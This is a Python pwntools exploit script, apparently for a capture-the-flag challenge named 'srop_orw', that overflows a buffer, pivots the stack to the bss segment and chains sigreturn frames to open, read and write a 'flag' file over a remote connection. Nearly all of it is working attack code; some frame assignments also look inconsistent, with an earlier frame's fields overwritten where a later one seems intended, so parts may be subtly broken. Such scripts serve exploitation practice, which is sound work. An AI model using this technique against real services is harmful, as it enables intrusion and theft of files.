# import time
from pwn import *

# from LibcSearcher import *
# from ctypes import *
# from struct import pack
# from ae64 import AE64

# io = remote("192.168.170.128", 1234)
io = remote("192.168.170.128", 9999)
# context.arch = "amd64"

# io = remote("chall.pwnable.tw", 10100)
# io = remote("61.147.171.105",   51565)
# io = remote("node4.buuoj.cn", 29323)
# io = remote("node6.anna.nssctf.cn", 32168)
# io = remote("112.6.51.212", 32168)


# io = process('./srop_orw')
gdb.attach(io)

# elf = ELF('./')


# libc = ELF('./libc-2.31.so')


def s(a):
    io.send(a)


def sa(a, b):
    io.sendafter(a, b)


def sl(a):
    io.sendline(a)


def sal(a, b):
    io.sendlineafter(a, b)


def r(n):
    return (io.recv(n))


def ru(a):
    return io.recvuntil(a)


def rl():
    return io.recvline()


def sla(a, b):
    io.sendlineafter(a, b)


def debug():
    gdb.attach(io)
    pause()


def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))


def inter():
    return io.interactive()


def print_addr(name, addr):
    print(f"{name} =", addr)


def operater(optr, opnd1, opnd2):
    optr_str_list = ['×', '**', '+', '-', '÷', '%']
    if optr in optr_str_list:
        index = optr_str_list.index(optr)
    if optr == optr_str_list[0]:  # 乘法
        result = opnd1 * opnd2
    elif optr == optr_str_list[1]:  # 幂运算
        result = opnd1 ** opnd2
    elif optr == optr_str_list[2]:  # 加法
        result = opnd1 + opnd2
    elif optr == optr_str_list[3]:  # 减法
        result = opnd1 - opnd2
    elif optr == optr_str_list[4]:  # 除法
        if opnd2 != 0:  # 避免除以零错误
            result = opnd1 / opnd2
        else:
            result = "Error: Division by zero"
    elif optr == optr_str_list[5]:  # 取余
        if opnd2 != 0:  # 避免取余时除数为零
            result = opnd1 % opnd2
        else:
            result = "Error: Modulo by zero"
    else:
        result = "Error: Invalid operator"

    return result


context(os='linux', arch='amd64')
# context(os='linux', arch='amd64', log_level="debug")

__NR_read = 0
__NR_write = 1
__NR_open = 2
__NR_rt_sigreturn = 15

pop_rdi = 0x0000000000400813
call_syscall = 0x4005B0
buf_addr = 0x601020     #bss
sys_addr = 0x400750     #mov eax, 15
main_addr = 0x40075B    #结束地址

do_sigreturn = p64(pop_rdi) + p64(__NR_rt_sigreturn) + p64(call_syscall)

openFrame = SigreturnFrame()
openFrame.rdi = __NR_open
openFrame.rsi = buf_addr
openFrame.rcx = 0

openFrame.rip = call_syscall
openFrame.sp = buf_addr + 8 + 8 + 8 + 8 + 248

payload2 = b'flag\x00\x00\x00\x00' + do_sigreturn + bytes(openFrame)

readFrame = SigreturnFrame()
readFrame.rdi = __NR_read
readFrame.rsi = 3
readFrame.rdx = buf_addr
readFrame.rcx = 20

openFrame.rip = call_syscall
openFrame.sp = buf_addr + 8 + 8 + 8 + 8 + 248 + 8 + 8 + 8 + 248

payload2 += do_sigreturn + bytes(readFrame)

writeFrame = SigreturnFrame()
writeFrame.rdi = __NR_write
writeFrame.rsi = 1
writeFrame.rdx = buf_addr
writeFrame.rcx = 20

openFrame.rip = call_syscall
openFrame.sp = buf_addr + 8 + 8 + 8 + 248 + 8 + 8 + 8 + 248 + 8 + 8 + 8 + 248

payload2 += do_sigreturn + bytes(writeFrame)

payload2 += p64(main_addr)

migrationFrame = SigreturnFrame()
migrationFrame.rdi = __NR_read
migrationFrame.rsi = 0
migrationFrame.rdx = buf_addr
migrationFrame.rcx = len(payload2)

migrationFrame.rip = call_syscall
migrationFrame.sp = buf_addr + 8

payload1 = b'a' * 0x38 + do_sigreturn + bytes(migrationFrame)

ru('F2023!')
sl(payload1)
sleep(3)
sl(payload2)

inter()